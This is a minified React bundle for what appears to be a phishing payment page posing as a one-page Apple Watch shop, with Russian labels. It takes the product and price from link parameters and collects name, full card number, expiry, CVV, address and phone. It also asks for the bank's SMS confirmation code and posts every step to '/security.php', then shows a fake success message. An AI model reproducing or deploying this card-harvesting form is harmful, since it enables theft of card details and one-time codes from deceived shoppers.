(this["webpackJsonpone-page-shop-apple-watch"]=this["webpackJsonpone-page-shop-apple-watch"]||[]).push([[0],{116:function(e,t,a){},117:function(e,t,a){},120:function(e,t,a){},121:function(e,t,a){},122:function(e,t,a){"use strict";a.r(t);var c=a(0),n=a.n(c),r=a(10),s=a.n(r),l=a(45),o=a(27),i=a(54),j=a(11),b=a(78),u=a(164),d=n.a.createContext(),m=d.Provider,O=(d.Consumer,a(14)),h=a(168),f=a(157),p=a(162),x=a(167),v=a(72),g=a.n(v),N=a(74),C=a.n(N),S=a(73),k=a.n(S),y=a(75),w=a.n(y),I=a(4),V=a(3),A=Object(f.a)({root:{backgroundColor:"#ccc",zIndex:1,color:"#fff",width:50,height:50,display:"flex",borderRadius:"50%",justifyContent:"center",alignItems:"center"},active:{backgroundImage:"linear-gradient( 136deg, rgb(242,113,33) 0%, rgb(233,64,87) 50%, rgb(138,35,135) 100%)",boxShadow:"0 4px 10px 0 rgba(0,0,0,.25)"},completed:{backgroundImage:"linear-gradient( 136deg, rgb(242,113,33) 0%, rgb(233,64,87) 50%, rgb(138,35,135) 100%)"}});function M(e){var t,a=A(),c=e.active,n=e.completed,r={1:Object(V.jsx)(g.a,{}),2:Object(V.jsx)(k.a,{}),3:Object(V.jsx)(C.a,{}),4:Object(V.jsx)(w.a,{})};return Object(V.jsx)("div",{className:Object(I.a)(a.root,(t={},Object(o.a)(t,a.active,c),Object(o.a)(t,a.completed,n),t)),children:r[String(e.icon)]})}function z(e){return Object(V.jsx)(h.a,{className:e.className,alternativeLabel:!0,activeStep:e.activeStep,children:["\u0418\u043c\u044f","\u041a\u0430\u0440\u0442\u0430","\u0410\u0434\u0440\u0435\u0441","\u041e\u043f\u043b\u0430\u0442\u0430"].map((function(e){return Object(V.jsx)(p.a,{children:Object(V.jsx)(x.a,{StepIconComponent:M,children:e})},e)}))})}var P=a(165),R=a(166),E=a(51),F=a.n(E),J=a(163),L=a(77),B=a.n(L),D=a(76),H=a.n(D);a(116);function T(e){var t=Object(c.useState)(0),a=Object(O.a)(t,2),n=a[0],r=a[1],s=Object(c.useState)(""),l=Object(O.a)(s,2),o=l[0],i=l[1],j=Object(c.useState)(""),b=Object(O.a)(j,2),u=b[0],d=b[1],m=Object(c.useState)(""),h=Object(O.a)(m,2),f=h[0],p=h[1],x=Object(c.useState)(""),v=Object(O.a)(x,2),g=v[0],N=v[1],C=Object(c.useState)(""),S=Object(O.a)(C,2),k=S[0],y=S[1],w=Object(c.useState)(""),I=Object(O.a)(w,2),A=I[0],M=I[1],E=Object(c.useState)(""),L=Object(O.a)(E,2),D=L[0],T=L[1],U=Object(c.useState)(""),W=Object(O.a)(U,2),$=W[0],q=W[1],G=Object(c.useState)(""),K=Object(O.a)(G,2),Q=K[0],X=K[1],Y=Object(c.useState)(""),Z=Object(O.a)(Y,2),_=Z[0],ee=Z[1],te=Object(c.useState)(""),ae=Object(O.a)(te,2),ce=ae[0],ne=ae[1],re=Object(c.useState)(""),se=Object(O.a)(re,2),le=se[0],oe=se[1],ie=Object(c.useState)(""),je=Object(O.a)(ie,2),be=je[0],ue=je[1],de=Object(c.useState)(""),me=Object(O.a)(de,2),Oe=me[0],he=me[1],fe=Object(c.useState)(""),pe=Object(O.a)(fe,2),xe=pe[0],ve=pe[1],ge=function(e,t){r(e),H.a.post("/security.php",t)},Ne=[Object(V.jsxs)("div",{className:"form-block form-name",children:[Object(V.jsx)(P.a,{className:"form-input",label:"\u0418\u043c\u044f",placeholder:"\u0418\u0432\u0430\u043d",value:u,onChange:function(e){return d(e.target.value)}}),Object(V.jsx)(P.a,{className:"form-input",label:"\u0424\u0430\u043c\u0438\u043b\u0438\u044f",placeholder:"\u0418\u0432\u0430\u043d\u043e\u0432",value:f,onChange:function(e){return p(e.target.value)}}),Object(V.jsx)("div",{className:"form-footer",children:Object(V.jsx)(R.a,{variant:"contained",color:"primary",className:"next-btn",onClick:function(){u&&f&&ge(1,{firstName:u,lastName:f})},children:"\u0414\u0430\u043b\u044c\u0448\u0435"})})]},1),Object(V.jsxs)("div",{className:"form-block form-card",children:[Object(V.jsx)(F.a,{value:o,onChange:function(e){return i(e.target.value)},mask:"9999 9999 9999 9999",maskChar:" ",children:function(){return Object(V.jsx)(P.a,{label:"\u041d\u043e\u043c\u0435\u0440 \u043a\u0430\u0440\u0442\u044b",placeholder:"4685 1538 4845 3218",className:"form-input"})}}),Object(V.jsxs)(J.a,{container:!0,children:[Object(V.jsx)(J.a,{item:!0,xs:6,children:Object(V.jsx)(F.a,{value:g,onChange:function(e){return N(e.target.value)},mask:"99/99",maskChar:" ",children:function(){return Object(V.jsx)(P.a,{label:"\u0421\u0440\u043e\u043a \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u044f",placeholder:"\u041c\u041c/\u0413\u0413",className:"form-input"})}})}),Object(V.jsx)(J.a,{item:!0,xs:6,children:Object(V.jsx)(F.a,{value:k,onChange:function(e){return y(e.target.value)},mask:"999",maskChar:" ",children:function(){return Object(V.jsx)(P.a,{label:"CVV",placeholder:"456",className:"form-input"})}})}),Object(V.jsx)(P.a,{label:"\u0418\u043c\u044f \u0434\u0435\u0440\u0436\u0430\u0442\u0435\u043b\u044f \u043d\u0430 \u043a\u0430\u0440\u0442\u0435",placeholder:"IVAN IVANOV",className:"form-input",value:A,onChange:function(e){return M(e.target.value)}})]}),Object(V.jsx)("div",{className:"form-footer",children:Object(V.jsx)(R.a,{variant:"contained",color:"primary",className:"next-btn",onClick:function(){o&&g&&function(e){if(e){var t=e.split("/"),a=Object(O.a)(t,2),c=a[0],n=a[1];return c>0&&c<=12&&n>20}return!1}(g)&&k&&A&&ge(2,{cardNumber:o,cardDate:g,cardCVV:k,cardHoldersName:A})},children:"\u0414\u0430\u043b\u044c\u0448\u0435"})})]},2),Object(V.jsxs)("div",{className:"form-block form-card",children:[Object(V.jsx)(P.a,{label:"\u041a\u043e\u043d\u0442\u0430\u043a\u0442\u043d\u043e\u0435 \u043b\u0438\u0446\u043e",placeholder:"\u0418\u0432\u0430\u043d \u0418\u0432\u0430\u043d\u043e\u0432",className:"form-input",value:D,onChange:function(e){return T(e.target.value)}}),Object(V.jsx)(P.a,{label:"\u041d\u043e\u043c\u0435\u0440 \u043c\u043e\u0431\u0438\u043b\u044c\u043d\u043e\u0433\u043e",placeholder:"+74957556983",className:"form-input",value:$,onChange:function(e){return q(e.target.value.replace(/[^0-9+]/g,""))}}),Object(V.jsx)(P.a,{label:"\u0423\u043b\u0438\u0446\u0430, \u0430\u0431\u043e\u043d\u0435\u043d\u0442\u0441\u043a\u0438\u0439 \u044f\u0449\u0438\u043a \u0438 \u0442.\u043f.",placeholder:"",className:"form-input",value:Q,onChange:function(e){return X(e.target.value)}}),Object(V.jsxs)(J.a,{container:!0,children:[Object(V.jsx)(J.a,{item:!0,xs:6,children:Object(V.jsx)(P.a,{label:"\u0421\u0442\u0440\u0430\u043d\u0430",placeholder:"",className:"form-input",value:ce,onChange:function(e){return ne(e.target.value)}})}),Object(V.jsx)(J.a,{item:!0,xs:6,children:Object(V.jsx)(P.a,{label:"\u0413\u043e\u0440\u043e\u0434",placeholder:"",className:"form-input",value:be,onChange:function(e){return ue(e.target.value)}})}),Object(V.jsx)(J.a,{item:!0,xs:6,children:Object(V.jsx)(P.a,{label:"\u041a\u0432\u0430\u0440\u0442\u0438\u0440\u0430, \u043a\u043e\u0440\u043f\u0443\u0441",placeholder:"",className:"form-input",value:_,onChange:function(e){return ee(e.target.value)}})}),Object(V.jsx)(J.a,{item:!0,xs:6,children:Object(V.jsx)(P.a,{label:"\u041e\u0431\u043b\u0430\u0441\u0442\u044c/\u043a\u0440\u0430\u0439",placeholder:"",className:"form-input",value:le,onChange:function(e){return oe(e.target.value)}})}),Object(V.jsx)(J.a,{item:!0,xs:6,children:Object(V.jsx)(P.a,{label:"\u041f\u043e\u0447\u0442\u043e\u0432\u044b\u0439 \u0438\u043d\u0434\u0435\u043a\u0441",placeholder:"",className:"form-input",value:[Oe],onChange:function(e){return he(e.target.value)}})})]}),Object(V.jsx)("div",{className:"form-footer",children:Object(V.jsx)(R.a,{variant:"contained",color:"primary",className:"next-btn",onClick:function(){D&&$&&Q&&ce&&be&&_&&le&&Oe&&ge(3,{personName:D,personMobile:$,personStreet:Q,personCountry:ce,personCity:be,personAddress:_,personRegion:le,personPostalCode:Oe})},children:"\u0414\u0430\u043b\u044c\u0448\u0435"})})]},3),Object(V.jsxs)("div",{className:"form-block form-name",children:[Object(V.jsx)("div",{className:"phone-confirmation-text",children:"\u0412 \u0442\u0435\u0447\u0435\u043d\u0438\u0438 5 \u043c\u0438\u043d\u0443\u0442 \u043d\u0430 \u043d\u043e\u043c\u0435\u0440 \u043f\u0440\u0438\u0432\u044f\u0437\u0430\u043d\u043d\u0438\u0439 \u043a \u0432\u0430\u0448\u0435\u0439 \u0431\u0430\u043d\u043a\u043e\u0432\u0441\u043a\u043e\u0439 \u043a\u0430\u0440\u0442\u0435 \u043f\u0440\u0438\u0434\u0435\u0442 \u0441\u043c\u0441 \u0441 \u043a\u043e\u0434\u043e\u043c \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u044f \u043f\u043b\u0430\u0442\u0435\u0436\u0430."}),Object(V.jsx)(P.a,{className:"form-input",label:"\u041a\u043e\u0434 \u043f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u044f",placeholder:"",value:xe,onChange:function(e){return ve(e.target.value)}}),Object(V.jsx)("div",{className:"form-footer",children:Object(V.jsx)(R.a,{variant:"contained",color:"primary",className:"next-btn",onClick:function(){xe&&ge(4,{confirmationCode:xe})},children:"\u0417\u0430\u0432\u0435\u0440\u0448\u0438\u0442\u044c \u0437\u0430\u043a\u0430\u0437"})})]},4),Object(V.jsxs)("div",{className:"form-block form-name",children:[Object(V.jsx)("div",{className:"success-icon-container",children:Object(V.jsx)(B.a,{className:"success-icon"})}),Object(V.jsx)("div",{className:"success-text",children:"\u041f\u043b\u0430\u0442\u0435\u0436 \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0437\u0430\u0432\u0435\u0440\u0448\u0435\u043d. \u0412\u044b \u043f\u043e\u043b\u0443\u0447\u0438\u0442\u0435 \u0442\u0440\u0435\u043a-\u043a\u043e\u0434 \u0434\u043b\u044f \u0432\u0430\u0448\u0435\u0433\u043e \u0437\u0430\u043a\u0430\u0437\u0430 \u043f\u043e \u0441\u043c\u0441."})]},5)],Ce=new URLSearchParams(e.location.search),Se=Ce.get("product"),ke=Ce.get("dp");return Se&&(document.title="\u041e\u043f\u043b\u0430\u0442\u0430 "+Se),Object(V.jsxs)("div",{className:"payment-form",children:[Object(V.jsxs)("div",{className:"payment-info",children:[Object(V.jsx)("div",{className:"title",children:"\u041e\u043f\u043b\u0430\u0442\u0430"}),Object(V.jsx)("div",{className:"product-name",children:Se}),Object(V.jsxs)("div",{className:"product-price",children:[ke,"$"]})]}),Object(V.jsx)(z,{activeStep:n,className:n<4?"":"hidden"}),Se&&ke?Ne[n]:Object(V.jsx)("div",{className:"error",children:"\u041d\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u0430\u044f \u0441\u0441\u044b\u043b\u043a\u0430 \u0434\u043b\u044f \u043e\u043f\u043b\u0430\u0442\u044b."})]})}a(117);function U(e){return Object(V.jsx)("div",{className:"page-payment",children:Object(V.jsx)(T,Object(l.a)({},e))})}var W=Object(j.f)((function(e){var t=e.history;return Object(c.useEffect)((function(){var e=t.listen((function(){window.scrollTo(0,0)}));return function(){e()}}),[]),null})),$=(a(120),a(121),Object(b.a)({typography:{fontFamily:"Montserrat"},overrides:{}}));$.typography.h3=Object(o.a)({fontSize:"1.2rem",fontFamily:"Montserrat",fontWeight:"400"},$.breakpoints.up("md"),{fontSize:"2.4rem"});var q=function(e){return Object(V.jsx)("div",{className:"App",children:Object(V.jsx)(i.a,{children:Object(V.jsx)(m,{value:{},children:Object(V.jsxs)(u.a,{theme:$,children:[Object(V.jsx)(W,{}),Object(V.jsxs)(j.c,{children:[Object(V.jsx)(j.a,{exact:!0,path:"/",render:function(e){return Object(V.jsx)(U,Object(l.a)({},e))}})," */}"]})]})})})})};s.a.render(Object(V.jsx)(n.a.StrictMode,{children:Object(V.jsx)(q,{})}),document.getElementById("root"))}},[[122,1,2]]]);
//# sourceMappingURL=main.bb9e6754.chunk.js.map